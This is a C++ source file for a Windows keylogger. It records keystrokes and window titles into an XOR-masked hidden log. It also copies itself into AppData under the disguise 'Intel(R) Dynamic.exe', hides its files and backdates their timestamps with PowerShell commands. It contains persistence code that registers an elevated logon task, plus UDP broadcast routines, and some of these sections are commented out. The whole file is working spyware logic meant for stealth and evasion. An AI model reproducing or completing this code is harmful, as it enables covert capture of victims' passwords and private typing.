#include "KeyLogger.h"

#include <iostream>
#include <chrono>
#include <iomanip>
#include <sstream>

#include <windows.h>
#include <taskschd.h>
#include <comutil.h>
//#include <Psapi.h>
//#include <comdef.h>
#include <filesystem>

//#include <shlobj.h> // For SHGetFolderPath

//#pragma comment(lib, "taskschd.lib")
//#pragma comment(lib, "Ws2_32.lib")

#define ASSERT(condition, ...)\
		if(!(condition)) {\
			std::cout << (__VA_ARGS__) << std::endl;\
			__debugbreak();\
		}

#define VERIFY(condition)\
		{\
			int res = (condition);\
			if(res != 0) {\
				return res;\
			}\
		}

#define COM_VERIFY(condition)\
		{\
			HRESULT res = (condition);\
			if(res != S_OK) {\
				return res;\
			}\
		}

uint32_t KeyLogger::s_TimerThreshold = 2;

void KeyLogger::Init()
{
	std::cout << "Initializing..." << std::endl;
	SetDirectory();
/*
#ifdef HOST_LOGGER
	SendBroadcast();
#else
	ReceiveBroadcast();
#endif
*/
	s_EncodeMask = 0x3F3E; // Set Encode mask
	ReadFromFile();
	//s_KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardCallback, GetModuleHandle(NULL), 0); // Set keyboard Hook
	if (s_KeyboardHook)
		std::cout << "Hook set" << std::endl;
	else
		std::cout << "Failed To Set Keyboard Hook" << std::endl;

	// Try adding new task in task scheduler (admin needed)
	HRESULT res = InitTaskSheduler();
	if (res != S_OK) // task scheduler setup failed, probably access denied
	{
		// Get Error
		//_com_error err(res);
		//LPCTSTR errMsg = err.ErrorMessage();
		//std::wstring errorMsgWide(errMsg);
		//errorMsgWide.push_back(L'\n');

		// Log error message
		std::u16string str = u"\nTask Creation Failed. Error Code: ";
		std::cout << "\nTask Creation Failed" << std::endl;
		ApplyMask(&str);
		//ApplyMask(&errorMsgWide);
		
		//std::string utf8Character = s_Utf16To8Converter.to_bytes(str) + s_WCharTo8ConverterWChar.to_bytes(errorMsgWide);
		//auto& x = (s_LogFileStream << utf8Character << std::flush);

		// do autostart by autostart folder
	}
	else
	{
		std::cout << "\nTask Creation Successful" << std::endl;
	}
}

void KeyLogger::Run()
{
	std::cout << "Initializing Finished" << std::endl;
	std::cout << "KeyLogger Started." << std::endl;
	MSG msg;
	//while (BOOL bRet = GetMessage(&msg, NULL, 0, 0) != 0) // GetMessage blocks this thread and gets messages for callbacks
	{
		// Get error message if GetMessage returned something other than WM_QUIT = 0
// 		TranslateMessage(&msg);
// 		DispatchMessage(&msg);

		// Print the message or something?
	}
}

void KeyLogger::DeInit()
{
	s_LogFileStream.close();
}

LRESULT KeyLogger::KeyboardCallback(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HC_ACTION)
	{
		KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			if (s_Timer.ElapsedSeconds() > s_TimerThreshold) // Apply newline if not typing for s_TimerThreshold seconds
			{
				std::u16string utf16Character = u"\n";
				ApplyMask(&utf16Character);
				std::string utf8Character = s_Utf16To8Converter.to_bytes(utf16Character);

				s_LogFileStream << utf8Character << std::flush;
			}

			LogCurrentWindowInfo();

			std::u16string utf16Character = ParseChar((char16_t)kbStruct->vkCode);
			ApplyMask(&utf16Character);
			std::string utf8Character = s_Utf16To8Converter.to_bytes(utf16Character);

			s_LogFileStream << utf8Character << std::flush;

			//ReadFromFile();
			s_Timer.Reset();
		}
	}

	return 0;// CallNextHookEx(s_KeyboardHook, code, wParam, lParam);
}

std::u16string KeyLogger::ParseChar(char16_t character)
{
// 	bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000);
// 	bool capsLockOn = GetKeyState(VK_CAPITAL);
// 	bool altPressed = GetAsyncKeyState(VK_RMENU) & 0x8000;
// 
// 	// polish characters
// 	if (std::isalpha(character))
// 	{
// 		if (altPressed)
// 		{
// 			switch (character)
// 			{
// 			case L'E': return (shiftPressed || capsLockOn) ? u"Ę" : u"ę";
// 			case L'L': return (shiftPressed || capsLockOn) ? u"Ł" : u"ł";
// 			case L'O': return (shiftPressed || capsLockOn) ? u"Ó" : u"ó";
// 			case L'A': return (shiftPressed || capsLockOn) ? u"Ą" : u"ą";
// 			case L'S': return (shiftPressed || capsLockOn) ? u"Ś" : u"ś";
// 			case L'Z': return (shiftPressed || capsLockOn) ? u"Ż" : u"ż";
// 			case L'X': return (shiftPressed || capsLockOn) ? u"Ź" : u"ź";
// 			case L'C': return (shiftPressed || capsLockOn) ? u"Ć" : u"ć";
// 			case L'N': return (shiftPressed || capsLockOn) ? u"Ń" : u"ń";
// 			default: return u"";
// 			}
// 		}
// 		else
// 			character = (shiftPressed || capsLockOn) ? std::toupper(character) : std::tolower(character);
// 	}
// 	else
// 	{
// 		//https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
// 		switch (character)
// 		{
// 			case VK_LEFT: return u"|LEFT|";
// 			case VK_UP: return u"|UP|";
// 			case VK_DOWN: return u"|DOWN|";
// 			case VK_RIGHT: return u"|RIGHT|";
// 			case 0x31: return shiftPressed ? u"!" : u"1";
// 			case 0x32: return shiftPressed ? u"@" : u"2";
// 			case 0x33: return shiftPressed ? u"#" : u"3";
// 			case 0x34: return shiftPressed ? u"$" : u"4";
// 			case 0x35: return shiftPressed ? u"%" : u"5";
// 			case 0x36: return shiftPressed ? u"^" : u"6";
// 			case 0x37: return shiftPressed ? u"&" : u"7";
// 			case 0x38: return shiftPressed ? u"*" : u"8";
// 			case 0x39: return shiftPressed ? u"(" : u"9";
// 			case 0x30: return shiftPressed ? u")" : u"0";
// 			case VK_OEM_1: return shiftPressed ? u":" : u";";
// 			case VK_OEM_2: return shiftPressed ? u"?" : u"/";
// 			case VK_OEM_3: return shiftPressed ? u"~" : u"`";
// 			case VK_OEM_4: return shiftPressed ? u"{" : u"[";
// 			case VK_OEM_5: return shiftPressed ? u"|" : u"\\";
// 			case VK_OEM_6: return shiftPressed ? u"}" : u"]";
// 			case VK_OEM_7: return shiftPressed ? u"\"" : u"'";
// 			case VK_OEM_MINUS: return shiftPressed ? u"_" : u"-";
// 			case VK_OEM_PLUS: return shiftPressed ? u"+" : u"=";
// 			case VK_OEM_COMMA: return shiftPressed ? u"<" : u",";
// 			case VK_OEM_PERIOD: return shiftPressed ? u">" : u".";
// 			case VK_BACK: return u"|BACK|"; // backspace
// 			case VK_DELETE: return u"|DEL|";
// 			case VK_END: return u"|END|";
// 			case VK_HOME: return u"|HOME|";
// 			case VK_PRIOR: return u"|PAGE UP|";
// 			case VK_NEXT: return u"|PAGE DOWN|";
// 			case VK_SNAPSHOT: return u"|SCREEN SHOT|";
// 			case VK_INSERT: return u"|INSERT|";
// 			case VK_SPACE: return u" ";
// 			case VK_RETURN: return u"|RETURN|";
// 
// 			default: return u"";
// 		}
// 	}
// 
 	std::u16string str;
// 	str.push_back(character);
 	return str;
}

std::u16string KeyLogger::GetCurrentWindowInfo()
{
// 	HWND hwnd = GetForegroundWindow(); // Get handle to active window
// 	if (hwnd != NULL) 
// 	{
// 		wchar_t processName[MAX_PATH];
// 		DWORD processID;
// 		GetWindowThreadProcessId(hwnd, &processID);
// 		HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
// 
// 		if (processHandle != NULL) 
// 		{
// 			//GetModuleFileNameEx(processHandle, NULL, processName, MAX_PATH);
// 			CloseHandle(processHandle);
// 		}
// 		else 
// 		{
// 			wchar_t data[MAX_PATH] = L"Unable to open process.";
// 			memcpy(&processName, &data, MAX_PATH);
// 		}
// 
// 		const int bufferSize = 256;
// 		wchar_t windowTitle[bufferSize];
// 		HRESULT x = GetWindowText(hwnd, windowTitle, bufferSize);
// 		std::u16string windowTitle16(reinterpret_cast<const char16_t*>(windowTitle));
// 		std::u16string processName16(reinterpret_cast<const char16_t*>(processName)); // ignore the warning
// 		return u"[WindowTitle: " + windowTitle16 + u", Process: " + processName16 + u"]";
// 	}
// 	else 
	{
		return u"No active window found.";
	}
}

void KeyLogger::LogCurrentWindowInfo()
{
	static std::u16string prevWinInfo;
	std::u16string winInfo = GetCurrentWindowInfo() + u"\n\n";

	if (prevWinInfo != winInfo) // window has changed
	{
		prevWinInfo = winInfo;

		// Date
		auto now = std::chrono::system_clock::now();
		std::time_t now_c = std::chrono::system_clock::to_time_t(now);
		// Convert to tm struct for breaking down into year, month, day, etc.
		struct tm* parts = std::localtime(&now_c);

		std::stringstream ss;
		ss << "\n\n[Time: "
			<< parts->tm_mday << "."         // Day
			<< 1 + parts->tm_mon << "."      // Month (tm_mon is months since January)
			<< 1900 + parts->tm_year << " "  // Year
			<< std::setfill('0') << std::setw(2) << parts->tm_hour << ":" // Hour (24-hour)
			<< std::setfill('0') << std::setw(2) << parts->tm_min << "]"  // Minute
			<< std::endl;

		// Convert string into u16string apply mask then convert it back, otherwise encryption wont work properly
		std::string dateTimeStr = ss.str();
		std::u16string dateTimeStrU16 = s_Utf8To16Converter.from_bytes(dateTimeStr);
		ApplyMask(&dateTimeStrU16);
		dateTimeStr = s_Utf16To8Converter.to_bytes(dateTimeStrU16);

		ApplyMask(&winInfo);
		std::string utf8WinInfo = s_Utf16To8Converter.to_bytes(winInfo);
		s_LogFileStream << dateTimeStr << utf8WinInfo << std::flush;
	}
}

// DEBUG ONLY
void KeyLogger::ReadFromFile()
{
	std::ifstream ifs("share/data", std::ios::binary);

	std::string utf8String;
	ifs >> utf8String;

	std::u16string utf16String = s_Utf8To16Converter.from_bytes(utf8String);
	ApplyMask(&utf16String);

	utf8String = s_Utf16To8Converter.to_bytes(utf16String);
	std::cout << utf8String << std::endl;
}

void KeyLogger::ApplyMask(char16_t* character)
{
	(*character) ^= s_EncodeMask;
}

void KeyLogger::ApplyMask(std::u16string* str)
{
	for (int i = 0; i < str->size(); i++)
	{
		char16_t& c = (*str)[i];
		c ^= s_EncodeMask;
	}
}

void KeyLogger::ApplyMask(std::string* str)
{
	for (int i = 0; i < str->size(); i++)
	{
		char& c = (*str)[i];
		c ^= s_EncodeMask;
	}
}

void KeyLogger::ApplyMask(std::wstring* str)
{
	for (int i = 0; i < str->size(); i++)
	{
		wchar_t& c = (*str)[i];
		c ^= s_EncodeMask;
	}
}

void KeyLogger::SetDirectory()
{
	WCHAR appNameWide[MAX_PATH];
	GetModuleFileName(nullptr, appNameWide, MAX_PATH);
	s_ApplicationName = appNameWide;

	WCHAR appDataPathWide[MAX_PATH];
	HRESULT result;// = SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appDataPathWide);

	std::wstring appDataPathWideStr = appDataPathWide;
	appDataPathWideStr.append(L"\\Intel");

	std::wstring newPath;
	newPath.append(appDataPathWideStr);
	newPath.append(L"\\Intel(R) Dynamic.exe");

	if (!std::filesystem::exists(newPath)) // no need to copy anything if it already exists
	{
		if (std::filesystem::create_directory(appDataPathWideStr))
			std::cout << "Intel Directory Created" << std::endl;
		else
			std::cout << "Failed To Create Intel Directory, Already Created?" << std::endl;

#ifdef MOVE
		auto x = _wrename(s_ApplicationName.c_str(), newPath.c_str());
#else
		std::ifstream src(s_ApplicationName, std::ios::binary);
		std::ofstream dst(newPath, std::ios::binary);
		if (dst << src.rdbuf())
			std::cout << "Logger Copied" << std::endl;
		else
			std::cout << "Failed To Copy Logger" << std::endl;
#endif
	}

	// Set CWD to appdata and update app path (name)
	std::filesystem::current_path(appDataPathWideStr);
	s_ApplicationName = newPath;
	std::cout << "CWD Set" << std::endl;

	std::wstring shareFolderPathWide = appDataPathWideStr + L"\\share";
	if (!std::filesystem::exists(shareFolderPathWide))
	{
		std::filesystem::create_directory(shareFolderPathWide);
		SetFileAttributesW(shareFolderPathWide.c_str(), FILE_ATTRIBUTE_HIDDEN);
		s_LogFileStream = std::ofstream("share/data", std::ios::out | std::ios::binary); // Create file stream
		SetFileAttributesW(L"share/data", FILE_ATTRIBUTE_HIDDEN);
		s_LogFileStream.close(); // close the stream so that file isn't in use
		if (s_LogFileStream)
			std::cout << "Log File Created" << std::endl;
		else
			std::cout << "Failed To Create Log File" << std::endl;
	}
	else
		std::cout << "Failed To Create Share Dir, Already Created?" << std::endl;

	SetFileAttributesW(s_ApplicationName.c_str(), FILE_ATTRIBUTE_HIDDEN); // Reset last access time flag (for some reason it doesn't change when app is run?)
	SetFileAttributesW(s_ApplicationName.c_str(), FILE_ATTRIBUTE_NORMAL);

	// This won't work when launching from task sheduler but I guess that's ok? all dates will be set on first copy
	std::string shell;
	shell = "powershell (Get-Item 'Intel(R) Dynamic.exe').creationtime = Get-Date '2021-09-24'";
	result = system(shell.c_str());
	shell = "powershell (Get-Item 'Intel(R) Dynamic.exe').LastAccessTime = Get-Date '2021-09-24'";
	result = system(shell.c_str());
	shell = "powershell (Get-Item 'Intel(R) Dynamic.exe').lastwritetime = Get-Date '2021-09-24'";
	result = system(shell.c_str());
	std::cout << "EXE flags set" << std::endl;

	SetFileAttributesW(L"share/data", FILE_ATTRIBUTE_NORMAL); // file can't be hidden

	shell = "powershell (Get-Item 'share/data').creationtime = Get-Date '2021-09-24'";
	system(shell.c_str());
	shell = "powershell (Get-Item 'share/data').lastaccesstime = Get-Date '2021-09-24'";
	system(shell.c_str());
	shell = "powershell (Get-Item 'share/data').lastwritetime = Get-Date '2021-09-24'";
	system(shell.c_str());

	SetFileAttributesW(L"share/data", FILE_ATTRIBUTE_HIDDEN);

	std::cout << "Share flags set" << std::endl;

	s_LogFileStream.open("share/data", std::ios::app | std::ios::binary); // open the stream again

	SetFileAttributesW(shareFolderPathWide.c_str(), FILE_ATTRIBUTE_NORMAL); // file can't be hidden

	shell = "powershell (Get-Item 'share').creationtime = Get-Date '2021-09-24'";
	result = system(shell.c_str());
	shell = "powershell (Get-Item 'share').LastAccessTime = Get-Date '2021-09-24'";
	result = system(shell.c_str());
	shell = "powershell (Get-Item 'share').lastwritetime = Get-Date '2021-09-24'";
	result = system(shell.c_str());

	SetFileAttributesW(shareFolderPathWide.c_str(), FILE_ATTRIBUTE_HIDDEN);

	std::cout << "Log flags set" << std::endl;
}

int KeyLogger::SendBroadcast()
{
	WSADATA wsaData;
	int sockfd;
	struct sockaddr_in server_addr;
	char message[] = "sidi4don";
	int port = 49555; // use dynamic ports?

	// Initialize Winsock
	VERIFY(WSAStartup(MAKEWORD(2, 2), &wsaData));

	// Create a socket
	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	VERIFY(sockfd == INVALID_SOCKET);

	// Enable broadcasting
	char broadcast_enable = 1;
	VERIFY(setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &broadcast_enable, sizeof(broadcast_enable)));

	// Set up server address
	memset(&server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(port);
	server_addr.sin_addr.s_addr = htonl(INADDR_BROADCAST);

	// Send broadcast message
	VERIFY(sendto(sockfd, message, sizeof(message), 0, (struct sockaddr*)&server_addr, sizeof(server_addr)));

	// Listen for responses
	char response[1024];
	struct sockaddr_in senderAddr;
	int senderLen = sizeof(senderAddr);
	int recvSize;

	while (1) 
	{
		std::cout << "Waiting for connection" << std::endl;
		recvSize = recvfrom(sockfd, response, sizeof(response), 0, (struct sockaddr*)&senderAddr, &senderLen);
		if (recvSize == SOCKET_ERROR)
		{
			return 2137;
		}

		// Process the response and identify the device
		std::cout << "Received from " << inet_ntoa(senderAddr.sin_addr) << ": " << response << std::endl;
	}

	closesocket(sockfd);
	WSACleanup();

	return 0;
}

int KeyLogger::ReceiveBroadcast()
{
	WSADATA wsaData;
	int sockfd;
	struct sockaddr_in serverAddr, senderAddr;
	char buffer[1024];
	int broadcastPort = 49555;
	int senderLen = sizeof(senderAddr);

	// Initialize Winsock
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// Create a socket
	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd == SOCKET_ERROR) 
	{
		return 2138;
	}

	// Set up server address
	memset(&serverAddr, 0, sizeof(serverAddr));
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(broadcastPort);
	serverAddr.sin_addr.s_addr = INADDR_ANY;

	// Bind the socket
	if (bind(sockfd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0)
	{
		return 2139;
	}

	// Listen for messages and respond
	while (1) 
	{
		int recvLen = recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&senderAddr, &senderLen);
		if (recvLen < 0)
		{
			break;
		}

		buffer[recvLen] = '\0';
		std::cout << "Received message: " << buffer << std::endl;

		// Send a response back to the sender
		const char* response = "Juan Pablo 2";
		sendto(sockfd, response, strlen(response), 0, (struct sockaddr*)&senderAddr, senderLen);
	}

	closesocket(sockfd);
	WSACleanup();

	return 0;
}

HRESULT KeyLogger::InitTaskSheduler()
{
// 	COM_VERIFY(CoInitializeEx(NULL, COINIT_MULTITHREADED));
// 
// 	// Get task scheduler service and connect it with this application
// 	ITaskService* pService = NULL;
// 	COM_VERIFY(CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService));
// 	COM_VERIFY(pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t()));
// 
// 	// Create new task object
// 	ITaskDefinition* pTask = NULL;
// 	COM_VERIFY(pService->NewTask(0, &pTask));
// 
// 	// Get Task Principal
// 	IPrincipal* pPrincipal = NULL;
// 	pTask->get_Principal(&pPrincipal);
// 	pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST); // Set run as administrator
// 	pPrincipal->Release();
// 
// 	// Get task settings and set task to run as soon as possible after trigger condition is met
// 	ITaskSettings* pSettings = NULL;
// 	COM_VERIFY(pTask->get_Settings(&pSettings));
// 	COM_VERIFY(pSettings->put_StartWhenAvailable(VARIANT_TRUE));
// 	pSettings->Release();
// 
// 	// Get trigger collection (tasks can have multiple triggers)
// 	ITriggerCollection* pTriggerCollection = NULL;
// 	COM_VERIFY(pTask->get_Triggers(&pTriggerCollection));
// 
// 	// Add new trigger to trigger collection
// 	ITrigger* pTrigger = NULL;
// 	COM_VERIFY(pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger));
// 	pTriggerCollection->Release();
// 
// 	// Get pointer to a previously added trigger
// 	ILogonTrigger* pLogonTrigger = NULL;
// 	COM_VERIFY(pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger));
// 	pTrigger->Release();
// 
// 	// Configure the trigger
// 	COM_VERIFY(pLogonTrigger->put_Id(_bstr_t(L"Trigger1"))); // set the identifier for the trigger. It is used to identify trigger if there are multiple triggers in one task
// 	COM_VERIFY(pLogonTrigger->put_UserId(NULL)); // set the user for which the trigger will work, NULL is current user
// 	pLogonTrigger->Release();
// 
// 	// Get action collection (there can be multiple actions bound to single task)
// 	IActionCollection* pActionCollection = NULL;
// 	pTask->get_Actions(&pActionCollection);
// 
// 	// Add new action
// 	IAction* pAction = NULL;
// 	COM_VERIFY(pActionCollection->Create(TASK_ACTION_EXEC, &pAction)); // add execute action
// 	pActionCollection->Release();
// 
// 	// Get previously added action
// 	IExecAction* pExecAction = NULL;
// 	COM_VERIFY(pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction));
// 	pAction->Release();
// 
// 	// Configure the action
// 	COM_VERIFY(pExecAction->put_Path(_bstr_t(s_ApplicationName.c_str()))); // tell it what to execute
// 	pExecAction->Release();
// 
// 	ITaskFolder* pRootFolder = NULL;
// 	pService->GetFolder(_bstr_t(L"\\"), &pRootFolder); // Get pointer to a tasks root folder
// 
// 	// Finally register the task
// 	IRegisteredTask* pRegisteredTask = NULL;
// 	COM_VERIFY(pRootFolder->RegisterTaskDefinition(
// 		_bstr_t(L"Intel(R) Dynamic"),
// 		pTask,
// 		TASK_CREATE_OR_UPDATE,
// 		_variant_t(),
// 		_variant_t(),
// 		TASK_LOGON_INTERACTIVE_TOKEN,
// 		_variant_t(L""),
// 		&pRegisteredTask)
// 	);
// 
// 	// Cleanup, disconnect the COM library from the application
// 	pService->Release();
// 	pTask->Release();
// 	CoUninitialize();
// 
 	return S_OK;
}

HHOOK KeyLogger::s_KeyboardHook;
std::wstring KeyLogger::s_ApplicationName;
std::ofstream KeyLogger::s_LogFileStream;
uint16_t KeyLogger::s_EncodeMask;
Timer KeyLogger::s_Timer;

// Use a library instead of deprecated functions?
std::wstring_convert<std::codecvt_utf8_utf16<char16_t>, char16_t> KeyLogger::s_Utf8To16Converter;
std::wstring_convert<std::codecvt_utf8<char16_t>, char16_t> KeyLogger::s_Utf16To8Converter;
std::wstring_convert<std::codecvt_utf8<wchar_t>> KeyLogger::s_WCharTo8ConverterWChar;
